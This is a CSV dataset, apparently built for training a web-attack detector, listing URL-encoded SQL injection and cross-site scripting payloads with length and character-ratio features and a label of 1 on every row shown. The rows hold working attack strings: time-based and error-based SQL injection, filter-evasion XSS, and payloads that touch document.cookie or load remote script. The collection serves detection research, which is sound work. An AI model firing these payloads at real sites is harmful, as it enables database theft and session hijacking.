payload,payload_len,alpha,non_alpha,attack_feature,label
1%27%29%20where%201470%3D1470%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,160,72.5,27.500000000000004,60000.0,1
-5449%27%20or%204493%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284493%3D4493%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29,226,54.86725663716814,17.25663716814159,60000.0,1
1%27%29%20as%20tqdg%20where%209355%3D9355%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,136,88.23529411764706,11.76470588235294,60000.0,1
1%25%22%29%29%20and%20elt%284249%3D4249%2C7259%29%20and%20%28%28%22%25%22%3D%22,41,63.41463414634146,36.58536585365854,60000.0,1
-7773%27%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29,99,83.83838383838383,16.161616161616163,60000.0,1
1%27%29%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%27vkde%27%3D%27vkde,111,79.27927927927928,20.72072072072072,60000.0,1
1%22%20order%20by%201--,15,80.0,20.0,30000.0,1
1%27%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%27swke%27%3D%27swke,149,84.56375838926175,15.436241610738255,30000.0,1
1%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29--%20saxs,53,79.24528301886792,20.754716981132077,30000.0,1
-7511%29%29%20as%20xqzf%20where%209939%3D9939%20union%20all%20select%209939%2C9939%2C9939%2C9939%2C9939%2C9939%2C9939--,85,85.88235294117646,14.117647058823529,90000.0,1
%3Cbody%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5C%5D%5E%60%3Dalert%28%22crosssitescripting%22%29%3E,66,68.18181818181817,31.818181818181827,46.666666666666686,1
%3Ciframe%20src%3Dhttp%3A//vulnerability-lab.com/index.html%20%3C,53,94.33962264150944,5.660377358490564,5.999999999999997,1
%3Ctable%20background%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%22%3E,59,83.05084745762711,16.94915254237288,30000.0,1
%3Ctable%3E%3Ctd%20background%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%22%3E,63,80.95238095238095,19.047619047619047,30000.0,1
%3Cbgsound%20src%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%3B%22%3E,55,80.0,20.0,30000.0,1
%3Cbr%20size%3D%22%26%7Balert%28%27crosssitescripting%27%29%7D%22%3E,42,76.19047619047619,23.80952380952381,31.25,1
%3Ca%20href%3D%22http%3A//server.com/%22%3Ecrosssitescripting%3C/a%3E,51,86.27450980392157,13.725490196078425,15.909090909090901,1
%3Ca%20href%3D%22http%3A//www.google.com%22%3Ecrosssitescripting%3C/a%3E,54,87.03703703703704,12.962962962962962,14.893617021276595,1
%3Ca%20href%3D%22http%3A//1113982867/%22%3Ecrosssitescripting%3C/a%3E,51,86.27450980392157,13.725490196078425,15.909090909090901,1
%3Ca%20href%3D%22javascript%3Adocument.location%3D%27http%3A//www.vulnerability-lab.com/%27%22%3Ecrosssitescripting%3C/a%3E,97,79.38144329896907,20.618556701030926,60000.0,1
%3Cbase%20href%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%3B//%22%3E,55,76.36363636363637,23.636363636363637,30000.0,1
%22%3Balert%28%27crosssitescripting%27%29%3B//,32,78.125,21.875,28.000000000000004,1
%3Cinput%20type%3D%22image%22%20src%3D%22javascript%3Aalert%28%27crosssitescripting%27%29%3B%22%3E,66,78.78787878787878,21.21212121212121,30000.0,1
%3Ccrosssitescripting%20style%3D%22behavior%3A%20url%28crosssitescripting.htc%29%3B%22%3E,67,88.05970149253731,11.940298507462686,13.559322033898304,1
scriptalert%28crosssitescripting%29/script,38,94.73684210526315,5.26315789473685,5.555555555555563,1
%3Cimg%20style%3D%22crosssitescripting%3Aexpr/%2Acrosssitescripting%2A/ession%28alert%28%27crosssitescripting%27%29%29%22%3E,94,88.29787234042553,11.702127659574472,13.253012048192778,1
%3Ccrosssitescripting%20style%3D%22crosssitescripting%3Aexpression%28alert%28%27crosssitescripting%27%29%29%22%3E%20exp/%2A%3Ca%20style%3D%27no%5C%5Ccrosssitescripting%3Anocrosssitescripting%28%22%2A//%2A%22%29%3B%20crosssitescripting%3Aex/%2Acrosssitescripting%2A//%2A/%2A/pression%28alert%28%22crosssitescripting%22%29%29%27%3E,242,88.01652892561982,11.983471074380176,13.615023474178416,1
%3Chtml%20xmlns%3Acrosssitescripting%3E%3C%3Fimport%20namespace%3D%22crosssitescripting%22%20implementation%3D%22http%3A//ha.ckers.org/crosssitescripting.htc%22%3E%3Ccrosssitescripting%3Acrosssitescripting%3Ecrosssitescripting%3C/crosssitescripting%3Acrosssitescripting%3E,228,92.98245614035088,7.017543859649123,7.547169811320756,1
%3Cxml%20id%3Di%3E%3Cx%3E%3Cc%3E%3C%21%5Bcdata%5B%3Cimg%20src%3D%22javas%5D%5D%3E%3C%21%5Bcdata%5Bcript%3Aalert%28%27crosssitescripting%27%29%3B%22%3E%5D%5D%3E,91,67.03296703296702,32.96703296703298,49.18032786885248,1
%3C/c%3E%3C/x%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E%3C/span%3E,66,83.33333333333334,16.666666666666657,19.999999999999986,1
%3Cxml%20id%3D%22crosssitescripting%22%3E%3Ci%3E%3Cb%3E%3Cimg%20src%3D%22javas%3C%21--%20--%3Ecript%3Aalert%28%27crosssitescripting%27%29%22%3E%3C/b%3E%3C/i%3E%3C/xml%3E,107,75.70093457943925,24.29906542056075,32.098765432098766,1
%3Cspan%20datasrc%3D%22%23crosssitescripting%22%20datafld%3D%22b%22%20dataformatas%3D%22html%22%3E%3C/span%3E,75,85.33333333333334,14.666666666666657,17.187499999999986,1
%3Cxml%20src%3D%22crosssitescriptingtest.xml%22%20id%3Di%3E%3C/xml%3E%3Cspan%20datasrc%3D%23i%20datafld%3Dc%20dataformatas%3Dhtml%3E%3C/span%3E,101,89.10891089108911,10.89108910891089,12.22222222222222,1
%3C%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E,63,85.71428571428571,14.285714285714292,16.666666666666675,1
%3C%3Fimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E,55,85.45454545454545,14.545454545454547,17.021276595744684,1
%3Ct%3Aset%20attributename%3D%22innerhtml%22%20to%3D%22crosssitescripting%3Cscript%20defer%3Ealert%28%22crosssitescripting%22%29%3C/script%3E%22%3E,107,85.98130841121495,14.018691588785046,16.304347826086957,1
%3C/body%3E%3C/html%3E,14,71.42857142857143,28.57142857142857,40.0,1
%3Cscript%20src%3D%22http%3A//vulnerability-lab.com/crosssitescripting.jpg%22%3E%3C/script%3E,75,90.66666666666666,9.333333333333343,10.294117647058835,1
%3C%3F%20echo%28%27%3Cscr%29%27%3Becho%28%27ipt%3Ealert%28%22crosssitescripting%22%29%3C/script%3E%27%29%3B%20%3F%3E,68,70.58823529411765,29.411764705882348,41.66666666666666,1
%3Cimg%20src%3D%22http%3A//www.vulnerability-lab.com/file.php%3Fvariables%3Dmalicious%22%3E,73,93.15068493150685,6.849315068493155,7.352941176470592,1
%3Ciframe%20src%3Dhttp%3A//test.de%3E,27,88.88888888888889,11.111111111111114,12.500000000000004,1
%3Cbody%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5C%5D%5E%60%3Dalert%28%22xss%22%29%3E,51,58.82352941176471,41.17647058823529,69.99999999999999,1
%3E%3Cimg%20id%3Dxss%20src%3Dx%20onerror%3Dalert%28xss%29%3B%3E,39,84.61538461538461,15.384615384615387,18.181818181818183,1
%3B%21--%22%3Cxss%3E%3D%26%7B%28%29%7D%22,17,41.17647058823529,58.82352941176471,142.8571428571429,1
%3Cimg%20id%3Dxss%20src%3D%22javascript%3Aalert%28%27xss%27%29%3B%22%3E,43,72.09302325581395,27.906976744186046,30000.0,1
%3Cimg%20id%3Dxss%20src%3Djavascript%3Aalert%28%27xss%27%29%3E,40,77.5,22.5,30000.0,1
%3Cimg%20id%3Dxss%20src%3Djavascript%3Aalert%28%22xss%22%29%3E,40,77.5,22.5,30000.0,1
%3Cimg%20id%3Dxss%20src%3D%60javascript%3Aalert%28%22%27xss%27%22%29%60%3E,44,70.45454545454545,25.0,30000.0,1
%3Cimg%20id%3Dxss%20src%3D%22jav%20ascript%3Aalert%28%27xss%27%29%3B%22%3E,44,77.27272727272727,22.727272727272734,29.411764705882366,1
%3Cimg%20id%3Dxss%20src%3Djavascript%3Aalert%28%22xss%22%29%3E%22%3B%27%20%3E,45,71.11111111111111,28.888888888888886,30000.0,1
%3Cimg%20id%3Dxss%20src%3D%22%20javascript%3Aalert%28%27xss%27%29%3B%22%3E,44,72.72727272727273,27.27272727272727,30000.0,1
%3C%3Cscript%3Ealert%28%22xss%22%29%3B//%3C%3C/script%3E,34,67.64705882352942,32.35294117647058,47.82608695652172,1
%22%3Balert%28%27xss%27%29%3B//,17,58.82352941176471,41.17647058823529,69.99999999999999,1
%3Cimg%20id%3Dxss%20src%3D%27javascript%3Aalert%28%27xss%27%29,40,77.5,22.5,30000.0,1
%3Cscript%3Ealert%28/xss/.source%29%3C/script%3E,36,83.33333333333334,16.666666666666657,19.999999999999986,1
%3Cbody%20background%3D%22javascript%3Aalert%28%27xss%27%29%22%3E,43,76.74418604651163,23.25581395348837,30000.0,1
%3C/title%3E%3Cscript%3Ealert%28%22xss%22%29%3B%3C/script%3E,38,71.05263157894737,28.94736842105263,40.74074074074074,1
%3Cinput%20type%3D%22image%22%20id%3Dxss%20src%3D%22javascript%3Aalert%28%27xss%27%29%3B%22%3E,58,74.13793103448276,25.862068965517242,30000.0,1
%3Cscript%3Ealert%28%27xssya%27%29%3C/script%3E,31,74.19354838709677,25.80645161290323,34.782608695652186,1
%3Cscript%3Ealert%28%22xssya%22%29%3C/script%3E,31,74.19354838709677,25.80645161290323,34.782608695652186,1
1%3Cscript%3Eprompt%28999691%29%3C/script%3E,32,81.25,18.75,23.076923076923077,1
//1%3Cscript%3Eprompt%28919397%29%3C/script%3E,34,82.35294117647058,17.64705882352942,21.42857142857144,1
%22%3Cscript%3Ealert%28%27xssya%27%29%3C/script%3E,32,71.875,28.125,39.130434782608695,1
%27%22%3C/script%3E%3Cscript%3Ealert%28%27xssya%27%29%3C/script%3E,42,71.42857142857143,28.57142857142857,40.0,1
1%3Cscript%20%3Eprompt%28962477%29%3C/script%3E,33,81.81818181818183,18.181818181818173,22.22222222222221,1
%3Cscript%3Ealert%281%29%3B%3C/script%3E,26,73.07692307692307,26.923076923076934,36.84210526315791,1
%22%3E%3Cscript%3Ealert%28%27xssya%27%29%3C/script%3E,33,69.6969696969697,30.303030303030297,43.478260869565204,1
%27%27%3B%21--%22%3Cxss%3E%3D%26%7B%28%29%7D,18,38.88888888888889,61.11111111111111,157.1428571428571,1
alert%281%29%3E,9,66.66666666666666,33.33333333333334,50.00000000000002,1
%22%3Balert%281%29//,12,66.66666666666666,33.33333333333334,50.00000000000002,1
%3Cscript%3Ealert%28%27xssya%27%29%3B%3C/script%3E,32,71.875,28.125,39.130434782608695,1
%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E,51,70.58823529411765,29.411764705882348,41.66666666666666,1
%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3Cscript%3Eipt%3E,41,75.60975609756098,24.390243902439025,32.25806451612903,1
javascript%3Aalert%281%29//,21,76.19047619047619,23.809523809523807,30000.0,1
%3Cscript%3Econfirm%280%29%3B%3C/script%3E,28,75.0,25.0,33.33333333333333,1
%22x%3Aalert%22%20onerror%3D%22eval%28src%2B%27%280%29%27%29%22%3E,36,66.66666666666666,33.33333333333334,50.00000000000002,1
data%3Atext/html%2C%3Cscript%3Ealert%280%29%3C/script%3E,40,82.5,17.5,21.21212121212121,1
%3Cbody/onhashchange%3Dalert%281%29%3E%3Ca%2Bhref%3D%23%3Eclickit,45,84.44444444444444,15.555555555555557,18.42105263157895,1
%3Cimg%2Bsrc%3Dx%2Bonerror%3Dprompt%281%29%3B%3E,30,83.33333333333334,16.666666666666657,19.999999999999986,1
%3Cvideo%2Bsrc%3Dx%2Bonerror%3Dprompt%281%29%3B%3E,32,84.375,15.625,18.51851851851852,1
%22javascript%3Aalert%282%29%22%3E,22,72.72727272727273,27.27272727272727,30000.0,1
%22%3Balert%28%27xss%29//,15,66.66666666666666,33.33333333333334,50.00000000000002,1
%3Cimg%20%22%22%22%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E%22%3E,40,62.5,37.5,60.0,1
x%20onfocus%3Dalert%281%29%3E,19,84.21052631578947,15.789473684210535,18.75000000000001,1
%3Ciframe/src%3D%22data%3Atext/html%3B%20base64%20%2Cpgjvzhkgb25sb2fkpwfszxj0kdeppg%3D%3D%22%3E,71,91.54929577464789,8.450704225352112,9.23076923076923,1
%22javascript%3Aalert%281%29%22%3E%3Cinput%20type%3Dsubmit%3E,41,78.04878048780488,21.951219512195124,30000.0,1
data%3Atext/html%2C%20type%3Dimage%3E,27,92.5925925925926,7.407407407407405,7.999999999999997,1
%3Cisindex%20action%3Dj%20a%20vas%20c%20r%20ipt%3Aalert%281%29%20type%3Dimage%3E,52,90.38461538461539,9.615384615384613,10.638297872340424,1
confirm%282%29%3E,11,72.72727272727273,27.272727272727266,37.499999999999986,1
%22http%3A//www.google.com./%22%3Exss%3C/a%3E,33,81.81818181818183,18.181818181818173,22.22222222222221,1
%22test%22%3E%3C/form%3E%3Cbutton%20form%3D%22test%22%20formaction%3D%22javascript%3Aalert%281%29%22%3Ex%3C/button%3E,77,74.02597402597402,25.97402597402597,30000.0,1
write%281%29%20autofocus%3E,19,84.21052631578947,15.789473684210535,18.75000000000001,1
write%281%29%20autofocus%3E%3Cinput%20autofocus%3E,36,86.11111111111111,13.888888888888886,16.129032258064512,1
javascript%3Aalert%281%29//%3E%3C/video%3E,30,70.0,30.0,30000.0,1
alert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,69,63.76811594202898,36.23188405797102,56.818181818181834,1
test%20onforminput%3Dalert%281%29%3E%3Cinput%3E%3C/form%3E%3Cbutton%20form%3Dtest%20onformchange%3Dalert%282%29%3Ex%3C/button%3E,90,85.55555555555556,14.444444444444443,16.88311688311688,1
%22alert%281%29%22%3E,11,54.54545454545454,45.45454545454546,83.33333333333334,1
%22alert%281%29%22%3E%3Csource%3E%3C/source%3E%3C/video%3E,36,69.44444444444444,30.555555555555557,44.00000000000001,1
%22javascript%3Aalert%281%29%22%3Ex%3C/button%3E,32,71.875,28.125,30000.0,1
alert%281%29%3E%3Cinput%20autofocus%3E,26,80.76923076923077,19.230769230769226,23.809523809523803,1
%22javascript%3Aalert%281%29%22%3Eclickme%3C/math%3E,36,75.0,25.0,30000.0,1
%22import%22%20href%3D%22test.svg%22%20/%3E,27,81.48148148148148,18.51851851851852,22.72727272727273,1
%3Ciframe%20srcdoc%3D%22%3Cimg%20src%3Dx%3Ax%20onerror%3Dalert%281%29%3E%22%20/%3E,50,82.0,18.0,21.951219512195124,1
%22x%22%3E%3Cimg%20onerror%3D%22alert%281%29%22%3E%3C/picture%3E,38,71.05263157894737,28.94736842105263,40.74074074074074,1
%22x%22%20onerror%3D%22alert%281%29%22%3E%3C/picture%3E,33,72.72727272727273,27.272727272727266,37.499999999999986,1
%22%2C%2C%2C%2C%2Cx%22%20onerror%3D%22alert%281%29%22%3E,28,75.0,25.0,33.33333333333333,1
%22javascript%3Aalert%281%29%22%3E%3C/table%3E,30,70.0,30.0,30000.0,1
%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,35,80.0,20.0,25.0,1
%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,42,80.95238095238095,19.04761904761905,23.529411764705888,1
%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,40,80.0,20.0,25.0,1
list-style%3Aurl%28%29%20onerror%3Dalert%281%29%3E%3C/li%3E,39,79.48717948717949,20.51282051282051,25.806451612903224,1
content%3Aurl%28data%3Aimage/svg%2Bxml%2C%3Csvg/%3E%29%3Bvisibility%3Ahidden%20onload%3Dalert%281%29%3E%3C/div%3E,79,83.54430379746836,16.45569620253164,19.696969696969692,1
%22javascript%3A//%22/%3E%3C/head%3E%3Cbody%3E%3Ca%20href%3D%22/.%20/%2Calert%281%29//,54,57.407407407407405,42.592592592592595,30000.0,1
%22data%3Atext/html%3Bbase64%2Cphnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg%3D%3D%22%3E%3C/object%3E,70,90.0,10.0,11.11111111111111,1
%22data%3Atext/html%3Bbase64%2Cphnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg%3D%3D%22%3E%3C/embed%3E,69,89.85507246376811,10.14492753623189,11.290322580645169,1
%3Cb%20%3Cscript%3Ealert%281%29//%3C/script%3E0%3C/script%3E%3C/b%3E,44,75.0,25.0,33.33333333333333,1
%22div1%22%3E%3Cinput%20value%3D%22%60%60onmouseover%3Dalert%281%29%22%3E%3C/div%3E%20%3Cdiv%20id%3D%22div2%22%3E%3C/div%3E,73,67.12328767123287,30.136986301369863,30000.0,1
document.getelementbyid%28%22div1%22%29.innerhtml%3B%3C/script%3E,51,86.27450980392157,13.725490196078425,15.909090909090901,1
width%3A1px%3Bfilter%3Aglow%20onfilterchange%3Dalert%281%29%3Ex%3C/div%3E,53,84.90566037735849,15.094339622641513,17.777777777777786,1
mhtml%3Ahttp%3A//html5sec.org/test.html%21xss.html%3E%3C/iframe%3E,54,88.88888888888889,11.111111111111114,12.500000000000004,1
%22x%60%20%60%3Cscript%3Ealert%281%29%3C/script%3E%22%60%20%60%3E,35,62.857142857142854,37.142857142857146,59.09090909090909,1
alt%3Dalert%281%29//%22%3E,16,75.0,25.0,33.33333333333333,1
alert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E%3C/title%3E,39,76.92307692307693,23.076923076923066,29.999999999999982,1
xx%3Axx%20onerror%3Dalert%281%29//--%21%3E,28,82.14285714285714,17.85714285714286,21.739130434782613,1
%22-o-link%3A%27javascript%3Aalert%281%29%27%3B-o-link-source%3Acurrent%22%3Ex%3C/a%3E,60,68.33333333333333,31.666666666666664,30000.0,1
%3Cstyle%3E%40import%20%22data%3A%2C%2A%7Bx%3Aexpression%28write%281%29%29%7D%22%3B%3C/style%3E,57,73.68421052631578,26.31578947368422,35.71428571428573,1
x%3Aexpression8write%281%299%3E,23,82.6086956521739,17.391304347826093,21.052631578947377,1
%24%2C_%3D1%7D%7D%29.%24%3Dalert%3C/script%3E,25,72.0,28.0,38.88888888888889,1
%3Cscript%3Ereferenceerror.prototype.__definegetter__%28%27name%27%2C%20function%28%29%7Balert%281%29%7D%29%2Cx%3C/script%3E,90,84.44444444444444,15.555555555555557,18.42105263157895,1
function%2C%5B%7B%7D%5D%5B0%5D.constructor._%28%27alert%281%29%27%29%28%29%3C/script%3E,53,69.81132075471697,30.188679245283026,43.243243243243256,1
%22%23%22%3E%7Balert%281%29%7D%3C/script%3E%3B1,25,56.00000000000001,43.99999999999999,78.57142857142854,1
%3Cb%3E%3Cscript%3Cb%3E%3C/b%3E%3Calert%281%29%3C/script%20%3C/b%3E%3C/b%3E,43,65.11627906976744,34.883720930232556,53.57142857142857,1
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Adocument.cookie%3Dtrue%3B%22%3E,76,80.26315789473685,19.736842105263158,99000.0,1
%3Cmeta%20http-equiv%3D%22set-cookie%22%20content%3D%22userid%3D%3Cscript%3Edocument.cookie%3Dtrue%3C/script%3E%22%3E,85,78.82352941176471,21.176470588235293,90000.0,1
%3Cscript%3Edocument.cookie%3Dtrue%3B%3C/script%3E,38,78.94736842105263,21.052631578947366,60000.0,1
%3Cimg%20src%3D%22jav%20ascript%3Adocument.cookie%3Dtrue%3B%22%3E,45,80.0,20.0,60000.0,1
%3Cimg%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,44,79.54545454545455,20.454545454545457,90000.0,1
%3Cimg%20src%3D%22%20javascript%3Adocument.cookie%3Dtrue%3B%22%3E,45,80.0,20.0,90000.0,1
%3Cbody%20onload%21%23%24%25%26%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B/%7C%5C%5C%5D%5E%60%3Ddocument.cookie%3Dtrue%3B%3E,60,48.333333333333336,41.66666666666667,60000.0,1
%3Cscript%3Edocument.cookie%3Dtrue%3B//%3C%3C/script%3E,41,73.17073170731707,26.82926829268293,60000.0,1
%3Cscript%20%3Cb%3Edocument.cookie%3Dtrue%3B%3C/script%3E,41,78.04878048780488,21.951219512195124,60000.0,1
%3Ciframe%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%3E,46,82.6086956521739,17.391304347826086,90000.0,1
%3Cscript%3Ea%3D/crosssitescripting/%20document.cookie%3Dtrue%3B%3C/script%3E,61,81.9672131147541,18.0327868852459,60000.0,1
%3C/title%3E%3Cscript%3Edocument.cookie%3Dtrue%3B%3C/script%3E,46,76.08695652173914,23.91304347826087,60000.0,1
%3Cinput%20type%3D%22image%22%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,59,79.66101694915254,20.33898305084746,90000.0,1
%3Cbody%20background%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,52,82.6923076923077,17.307692307692307,90000.0,1
%3Cbody%20onload%3Ddocument.cookie%3Dtrue%3B%3E,35,82.85714285714286,17.142857142857142,60000.0,1
%3Cimg%20dynsrc%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,47,80.85106382978722,19.148936170212767,90000.0,1
%3Cimg%20lowsrc%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,47,80.85106382978722,19.148936170212767,90000.0,1
%3Cbgsound%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,48,81.25,18.75,90000.0,1
%3Cbr%20size%3D%22%26%7Bdocument.cookie%3Dtrue%7D%22%3E,35,71.42857142857143,22.857142857142858,60000.0,1
%3Clayer%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E%3C/layer%3E,54,77.77777777777779,22.22222222222222,90000.0,1
%3Clink%20rel%3D%22stylesheet%22%20href%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,63,80.95238095238095,19.047619047619047,90000.0,1
%3Cstyle%3Eli%20%7Blist-style-image%3A%20url%28%22javascript%3Adocument.cookie%3Dtrue%3B%22%29%3B%3C/style%3E%3Cul%3E%3Cli%3Ecrosssitescripting,103,78.64077669902912,20.388349514563107,90000.0,1
scriptdocument.cookie%3Dtrue%3B/script,34,88.23529411764706,11.76470588235294,60000.0,1
%3Ciframe%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E%3C/iframe%3E,56,78.57142857142857,21.428571428571427,90000.0,1
%3Cframeset%3E%3Cframe%20src%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E%3C/frameset%3E,67,79.1044776119403,20.8955223880597,90000.0,1
%3Ctable%20background%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,53,83.01886792452831,16.9811320754717,90000.0,1
%3Ctable%3E%3Ctd%20background%3D%22javascript%3Adocument.cookie%3Dtrue%3B%22%3E,57,80.7017543859649,19.298245614035086,90000.0,1
%3Cdiv%20style%3D%22background-image%3A%20url%28javascript%3Adocument.cookie%3Dtrue%3B%29%22%3E,69,81.15942028985508,18.84057971014493,90000.0,1
%3Cdiv%20style%3D%22width%3A%20expression%28document.cookie%3Dtrue%29%3B%22%3E,54,79.62962962962963,20.37037037037037,60000.0,1
%3Cstyle%3E%40im%5C%5Cport%27%5C%5Cja%20asc%20ipt%3Adocument.cookie%3Dtrue%27%3B%3C/style%3E,58,75.86206896551724,20.689655172413794,60000.0,1
%3Cimg%20style%3D%22crosssitescripting%3Aexpr/%2Acrosssitescripting%2A/ession%28document.cookie%3Dtrue%29%22%3E,87,83.9080459770115,16.091954022988507,60000.0,1
